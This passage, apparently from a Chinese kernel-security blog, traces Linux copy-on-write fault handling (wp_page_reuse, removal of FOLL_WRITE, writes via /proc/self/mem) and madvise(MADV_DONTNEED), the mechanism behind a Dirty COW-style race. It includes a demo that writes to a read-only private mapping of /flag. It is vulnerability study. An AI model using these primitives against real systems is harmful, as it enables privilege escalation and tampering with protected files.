&#123;<br>    <span class="hljs-comment">//如果这个匿名页只有一个映射，那么不用重新分配页，直接把旧页拿去写</span><br><span class="hljs-keyword">if</span> (total_mapcount == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The page is all ours. Move it to</span><br><span class="hljs-comment"> * our anon_vma so the rmap code will</span><br><span class="hljs-comment"> * not search our parent or siblings.</span><br><span class="hljs-comment"> * Protected against the rmap code by</span><br><span class="hljs-comment"> * the page lock.</span><br><span class="hljs-comment"> */</span><br>                <span class="hljs-comment">//把旧业放到anon_vma中，这个涉及到反向映射</span><br>page_move_anon_rmap(old_page, vma);<br>&#125;<br>unlock_page(old_page);<br>    <span class="hljs-comment">//旧页只属于这个进程，尝试给PTE加上可写入标志</span><br><span class="hljs-keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>wp_page_reuse()</code>主要就是设置<strong>PTE</strong>, 然后返回<strong>VM_FAULT_WRITE</strong></p><ul><li><ul><li>注意由于这片<strong>VMA</strong>不可写入,因此<strong>PTE</strong>任然没有<strong>RW</strong>标志,</li></ul></li><li></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">wp_page_reuse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pte_t</span> orig_pte,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">int</span> page_mkwrite, <span class="hljs-type">int</span> dirty_shared)</span><br>__<span class="hljs-title function_">releases</span><span class="hljs-params">(fe-&gt;ptl)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br><span class="hljs-type">pte_t</span> entry;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Clear the pages cpupid information as the existing</span><br><span class="hljs-comment"> * information potentially belongs to a now completely</span><br><span class="hljs-comment"> * unrelated process.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (page)<br>page_cpupid_xchg_last(page, (<span class="hljs-number">1</span> &lt;&lt; LAST_CPUPID_SHIFT) - <span class="hljs-number">1</span>);<br><br>flush_cache_page(vma, fe-&gt;address, pte_pfn(orig_pte));<br>entry = pte_mkyoung(orig_pte);<span class="hljs-comment">//标记下刚刚访问过</span><br>entry = maybe_mkwrite(pte_mkdirty(entry), vma);  <span class="hljs-comment">//设置脏位，如果VMA可写的话设置写入位</span><br><span class="hljs-keyword">if</span> (ptep_set_access_flags(vma, fe-&gt;address, fe-&gt;pte, entry, <span class="hljs-number">1</span>))   <span class="hljs-comment">//写入PTE</span><br>update_mmu_cache(vma, fe-&gt;address, fe-&gt;pte); <span class="hljs-comment">//更新mmu缓存</span><br>pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br><br><span class="hljs-keyword">if</span> (dirty_shared) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span>;</span><br><span class="hljs-type">int</span> dirtied;<br><br><span class="hljs-keyword">if</span> (!page_mkwrite)<br>lock_page(page);<br><br>dirtied = set_page_dirty(page);<br>VM_BUG_ON_PAGE(PageAnon(page), page);<br>mapping = page-&gt;mapping;<br>unlock_page(page);<br>put_page(page);<br><br><span class="hljs-keyword">if</span> ((dirtied || page_mkwrite) &amp;&amp; mapping) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Some device drivers do not set page.mapping</span><br><span class="hljs-comment"> * but still dirty their pages</span><br><span class="hljs-comment"> */</span><br>balance_dirty_pages_ratelimited(mapping);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!page_mkwrite)<br>file_update_time(vma-&gt;vm_file);<br>&#125;<br>    <span class="hljs-keyword">return</span> VM_FAULT_WRITE; <span class="hljs-comment">//返回这个标志表示进行COW之后，这个页可以写入了</span><br>&#125;<br></code></pre></td></tr></table></figure><p>最后<code>handle_mm_fault()</code>返回到<code>faultin_page()</code>中时, 由于返回了<strong>VM_FAULT_WRIT</strong>E标志, 表示可以写入, 因此会去掉<code>flags</code>中的<strong>FOLL_WRITE</strong>标志, 不再检查写入权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>*flags &amp;= ~FOLL_WRITE;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>调用链如下</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">faultin_page</span>()<br><span class="hljs-built_in">handle_mm_fault</span>()<br><span class="hljs-built_in">__handle_mm_fault</span>()<br><span class="hljs-built_in">handle_pte_fault</span>()<br><span class="hljs-built_in">do_fault</span>()<br><span class="hljs-built_in">do_wp_page</span>()<br><span class="hljs-built_in">wp_page_reuse</span>()<br><span class="hljs-built_in">maybe_mkwrite</span>(pte_mkdirty(entry), vma);<br>                          return VM_FAULT_WRITE;<br></code></pre></td></tr></table></figure><h4 id="get-user-pagesの第三次循环"><a href="#get-user-pagesの第三次循环" class="headerlink" title="__get_user_pagesの第三次循环"></a>__get_user_pagesの第三次循环</h4><p>第三次进入<code>follow_page_mask()</code>, 由于之前去掉了<strong>FOLL_WRITE</strong>标志, 因此不会检查<strong>PTE</strong>有没有写入权限, 从而通过<code>follow_page_mask()</code>返回对应的页</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//如果要求写入，但是pte表示不可写入</span><br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>之后会沿着路径返回: <code>get_user_pages() -&gt;__ get_user_pages_locked() -&gt; get_user_page_remote() -&gt; __access_remote_vm()</code></li><li><code>__access_remote_vm()</code>锁定页面后, 先调用<code>kmap</code>把页面映射到内核地址空间中, 再调用<code>copy_to_user_page()</code>完成从内核缓冲区到对应页面的写入</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//此时的page为get_user_pages_remote()为用户寻找的，是被锁定在内存中的页，kmap将其映射在内核地址空间中</span><br>maddr = kmap(page);<br><span class="hljs-keyword">if</span> (write) &#123;<span class="hljs-comment">//写入请求</span><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                先调用copy_to_user_page()进行写入</span><br><span class="hljs-comment">                maddr为根据addr锁定的页，offset为addr额页内偏移，两者相加就是要写入的地址</span><br><span class="hljs-comment">                等价为：memcpy(maddr + offset, buf, bytes)</span><br><span class="hljs-comment">                */</span><br>copy_to_user_page(vma, page, addr,<br>  maddr + offset, buf, bytes);<br></code></pre></td></tr></table></figure><h2 id="madviseの使用方法"><a href="#madviseの使用方法" class="headerlink" title="madviseの使用方法"></a>madviseの使用方法</h2><p><code>madvise()</code>系统掉用，用于向内核提供对于起始地址为<code>addr</code>，长度为<code>length</code>的内存空间的操作建议或者指示。在大多数情况下，此类建议的目标是提高系统或者应用程序的性能。</p><h4 id="测试demo-1"><a href="#测试demo-1" class="headerlink" title="测试demo"></a>测试demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">processMem</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    lseek(f, mem, SEEK_SET);<br>    write(f, <span class="hljs-string">&quot;AAA&quot;</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, (<span class="hljs-type">char</span> *)mem);<br><br>    madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDONLY);<br>    fstat(fd, &amp;st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="hljs-number">0</span>);<br><br>    processMem();<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="sys-madvise"><a href="#sys-madvise" class="headerlink" title="sys_madvise()"></a>sys_madvise()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The madvise(2) system call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Applications can use madvise() to advise the kernel how it should</span><br><span class="hljs-comment"> * handle paging I/O in this VM area.  The idea is to help the kernel</span><br><span class="hljs-comment"> * use appropriate read-ahead and caching techniques.  The information</span><br><span class="hljs-comment"> * provided is advisory only, and can be safely disregarded by the</span><br><span class="hljs-comment"> * kernel without affecting the correct operation of the application.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * behavior values:</span><br><span class="hljs-comment"> *  MADV_NORMAL - the default behavior is to read clusters.  This</span><br><span class="hljs-comment"> *results in some read-ahead and read-behind.</span><br><span class="hljs-comment"> *  MADV_RANDOM - the system should read the minimum amount of data</span><br><span class="hljs-comment"> *on any access, since it is unlikely that the appli-</span><br><span class="hljs-comment"> *cation will need more than what it asks for.</span><br><span class="hljs-comment"> *  MADV_SEQUENTIAL - pages in the given range will probably be accessed</span><br><span class="hljs-comment"> *once, so they can be aggressively read ahead, and</span><br><span class="hljs-comment"> *can be freed soon after they are accessed.</span><br><span class="hljs-comment"> *  MADV_WILLNEED - the application is notifying the system to read</span><br><span class="hljs-comment"> *some pages ahead.</span><br><span class="hljs-comment"> *  MADV_DONTNEED - the application is finished with the given range,</span><br><span class="hljs-comment"> *so the kernel can free resources associated with it.</span><br><span class="hljs-comment"> *  MADV_FREE - the application marks pages in the given range as lazy free,</span><br><span class="hljs-comment"> *where actual purges are postponed until memory pressure happens.</span><br><span class="hljs-comment"> *  MADV_REMOVE - the application wants to free up the given range of</span><br><span class="hljs-comment"> *pages and associated backing store.</span><br><span class="hljs-comment"> *  MADV_DONTFORK - omit this area from child&#x27;s address space when forking:</span><br><span class="hljs-comment"> *typically, to avoid COWing pages pinned by get_user_pages().</span><br><span class="hljs-comment"> *  MADV_DOFORK - cancel MADV_DONTFORK: no longer omit this area when forking.</span><br><span class="hljs-comment"> *  MADV_HWPOISON - trigger memory error handler as if the given memory range</span><br><span class="hljs-comment"> *were corrupted by unrecoverable hardware memory failure.</span><br><span class="hljs-comment"> *  MADV_SOFT_OFFLINE - try to soft-offline the given range of memory.</span><br><span class="hljs-comment"> *  MADV_MERGEABLE - the application recommends that KSM try to merge pages in</span><br><span class="hljs-comment"> *this area with pages of identical content from other such areas.</span><br><span class="hljs-comment"> *  MADV_UNMERGEABLE- cancel MADV_MERGEABLE: no longer merge pages with others.</span><br><span class="hljs-comment"> *  MADV_HUGEPAGE - the application wants to back the given range by transparent</span><br><span class="hljs-comment"> *huge pages in the future. Existing pages might be coalesced and</span><br><span class="hljs-comment"> *new pages might be allocated as THP.</span><br><span class="hljs-comment"> *  MADV_NOHUGEPAGE - mark the given range as not worth being backed by</span><br><span class="hljs-comment"> *transparent huge pages so the existing pages will not be</span><br><span class="hljs-comment"> *coalesced into THP and new pages will not be allocated as THP.</span><br><span class="hljs-comment"> *  MADV_DONTDUMP - the application wants to prevent pages in the given range</span><br><span class="hljs-comment"> *from being included in its core dump.</span><br><span class="hljs-comment"> *  MADV_DODUMP - cancel MADV_DONTDUMP: no longer exclude from core dump.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * return values:</span><br><span class="hljs-comment"> *  zero    - success</span><br><span class="hljs-comment"> *  -EINVAL - start + len &lt; 0, start is not page-aligned,</span><br><span class="hljs-comment"> *&quot;behavior&quot; is not a valid value, or application</span><br><span class="hljs-comment"> *is attempting to release locked or shared pages.</span><br><span class="hljs-comment"> *  -ENOMEM - addresses in the specified range are not currently</span><br><span class="hljs-comment"> *mapped, or are outside the AS of the process.</span><br><span class="hljs-comment"> *  -EIO    - an I/O error occurred while paging in data.</span><br><span class="hljs-comment"> *  -EBADF  - map exists, but area maps something that isn&#x27;t a file.</span><br><span class="hljs-comment"> *  -EAGAIN - a kernel resource was temporarily unavailable.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">进程可以使用madvise()来建议内核怎么处理相关内存区域</span><br><span class="hljs-comment">@start: 内存起始地址</span><br><span class="hljs-comment">@len_in: 长度</span><br><span class="hljs-comment">@behavior: 建议</span><br><span class="hljs-comment">*/</span><br>SYSCALL_DEFINE3(madvise, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, start, <span class="hljs-type">size_t</span>, len_in, <span class="hljs-type">int</span>, behavior)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end, tmp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>, *<span class="hljs-title">prev</span>;</span><br><span class="hljs-type">int</span> unmapped_error = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> error = -EINVAL;<br><span class="hljs-type">int</span> write;<br><span class="hljs-type">size_t</span> len;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">blk_plug</span> <span class="hljs-title">plug</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span><br><span class="hljs-keyword">if</span> (behavior == MADV_HWPOISON || behavior == MADV_SOFT_OFFLINE)<br><span class="hljs-keyword">return</span> madvise_hwpoison(behavior, start, start+len_in);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">//检查一下behavior是否有效</span><br><span class="hljs-keyword">if</span> (!madvise_behavior_valid(behavior))<br><span class="hljs-keyword">return</span> error;<br><span class="hljs-comment">//要求起始地址与页对齐</span><br><span class="hljs-keyword">if</span> (start &amp; ~PAGE_MASK)<br><span class="hljs-keyword">return</span> error;<br>    <span class="hljs-comment">//len向上关于页对齐</span><br>len = (len_in + ~PAGE_MASK) &amp; PAGE_MASK;<br><br><span class="hljs-comment">/* Check to see whether len was rounded up from small -ve to zero */</span><br>    <span class="hljs-comment">//len溢出</span><br><span class="hljs-keyword">if</span> (len_in &amp;&amp; !len)<br><span class="hljs-keyword">return</span> error;<br><span class="hljs-comment">//结束地址</span><br>end = start + len;<br><span class="hljs-keyword">if</span> (end &lt; start)<br><span class="hljs-keyword">return</span> error;<br><br>error = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (end == start)<br><span class="hljs-keyword">return</span> error;<br><span class="hljs-comment">//判断下这个行为是否需要写入mmap，并获取相关信号量</span><br>write = madvise_need_mmap_write(behavior);<br><span class="hljs-keyword">if</span> (write) &#123;<br><span class="hljs-keyword">if</span> (down_write_killable(&amp;current-&gt;mm-&gt;mmap_sem))<br><span class="hljs-keyword">return</span> -EINTR;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>down_read(&amp;current-&gt;mm-&gt;mmap_sem);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If the interval [start,end) covers some unmapped address</span><br><span class="hljs-comment"> * ranges, just ignore them, but return -ENOMEM at the end.</span><br><span class="hljs-comment"> * - different from the way of handling in mlock etc.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//找到start对应的VMA对象</span><br>vma = find_vma_prev(current-&gt;mm, start, &amp;prev);<br><span class="hljs-keyword">if</span> (vma &amp;&amp; start &gt; vma-&gt;vm_start)<br>prev = vma;<br><br>blk_start_plug(&amp;plug);<br><span class="hljs-keyword">for</span> (;;) &#123;<span class="hljs-comment">//遍历所有相关的VMA</span><br><span class="hljs-comment">/* Still start &lt; end. */</span><br>error = -ENOMEM;<br><span class="hljs-keyword">if</span> (!vma)<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-comment">/* Here start &lt; (end|vma-&gt;vm_end). */</span><br><span class="hljs-keyword">if</span> (start &lt; vma-&gt;vm_start) &#123;<br>unmapped_error = -ENOMEM;<br>start = vma-&gt;vm_start;<br><span class="hljs-keyword">if</span> (start &gt;= end)<span class="hljs-comment">//start没有对应的VMA</span><br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-comment">/*tmp为本次建议的结束地址 Here vma-&gt;vm_start &lt;= start &lt; (end|vma-&gt;vm_end) */</span><br>        <br>tmp = vma-&gt;vm_end;<br><span class="hljs-keyword">if</span> (end &lt; tmp)<br>tmp = end;<br><br><span class="hljs-comment">/*进行建议 Here vma-&gt;vm_start &lt;= start &lt; tmp &lt;= (end|vma-&gt;vm_end). */</span><br>error = madvise_vma(vma, &amp;prev, start, tmp, behavior);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> out;<br>start = tmp;<span class="hljs-comment">//下一次循环的起始地址</span><br><span class="hljs-keyword">if</span> (prev &amp;&amp; start &lt; prev-&gt;vm_end)<br>start = prev-&gt;vm_end;<br>error = unmapped_error;<br><span class="hljs-keyword">if</span> (start &gt;= end)<span class="hljs-comment">//结束</span><br><span class="hljs-keyword">goto</span> out;<br>        <span class="hljs-comment">//重新寻找对应的VMA</span><br><span class="hljs-keyword">if</span> (prev)<br>vma = prev-&gt;vm_next;<br><span class="hljs-keyword">else</span><span class="hljs-comment">/* madvise_remove dropped mmap_sem */</span><br>vma = find_vma(current-&gt;mm, start);<br>&#125;<br>out:<br>blk_finish_plug(&amp;plug);<br><span class="hljs-keyword">if</span> (write)<br>up_write(&amp;current-&gt;mm-&gt;mmap_sem);<br><span class="hljs-keyword">else</span><br>up_read(&amp;current-&gt;mm-&gt;mmap_sem);<br><br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="madvise-vma"><a href="#madvise-vma" class="headerlink" title="madvise_vma()"></a>madvise_vma()</h4><p><code>madvice_vma()</code>根据<code>behavior</code>把请求分配到对应处理函数, 对于<strong>MADV_DONTNEE</strong>D会调用<code>madvise_dontneed()</code>处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">madvise_vma</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-keyword">struct</span> vm_area_struct **prev,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end, <span class="hljs-type">int</span> behavior)</span><br>&#123;<br><span class="hljs-keyword">switch</span> (behavior) &#123;<br><span class="hljs-keyword">case</span> MADV_REMOVE:<br><span class="hljs-keyword">return</span> madvise_remove(vma, prev, start, end);<br><span class="hljs-keyword">case</span> MADV_WILLNEED:<br><span class="hljs-keyword">return</span> madvise_willneed(vma, prev, start, end);<br><span class="hljs-keyword">case</span> MADV_FREE:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * <span class="hljs-doctag">XXX:</span> In this implementation, MADV_FREE works like</span><br><span class="hljs-comment"> * MADV_DONTNEED on swapless system or full swap.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (get_nr_swap_pages() &gt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> madvise_free(vma, prev, start, end);<br><span class="hljs-comment">/* passthrough */</span><br><span class="hljs-keyword">case</span> MADV_DONTNEED:<br><span class="hljs-keyword">return</span> madvise_dontneed(vma, prev, start, end);<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> madvise_behavior(vma, prev, start, end, behavior);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="madvise-dontneed"><a href="#madvise-dontneed" class="headerlink" title="madvise_dontneed()"></a>madvise_dontneed()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Application no longer needs these pages.  If the pages are dirty,</span><br><span class="hljs-comment"> * it&#x27;s OK to just throw them away.  The app will be more careful about</span><br><span class="hljs-comment"> * data it wants to keep.  Be sure to free swap resources too.  The</span><br><span class="hljs-comment"> * zap_page_range call sets things up for shrink_active_list to actually free</span><br><span class="hljs-comment"> * these pages later if no one else has touched them in the meantime,</span><br><span class="hljs-comment"> * although we could add these pages to a global reuse list for</span><br><span class="hljs-comment"> * shrink_active_list to pick up before reclaiming other pages.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * NB: This interface discards data rather than pushes it out to swap,</span><br><span class="hljs-comment"> * as some implementations do.  This has performance implications for</span><br><span class="hljs-comment"> * applications like large transactional databases which want to discard</span><br><span class="hljs-comment"> * pages in anonymous maps after committing to backing store the data</span><br><span class="hljs-comment"> * that was kept in them.  There is no reason to write this data out to</span><br><span class="hljs-comment"> * the swap area if the application is discarding it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * An interface that causes the system to free clean pages and flush</span><br><span class="hljs-comment"> * dirty pages is already available as msync(MS_INVALIDATE).</span><br><span class="hljs-comment"> */</span><br><span 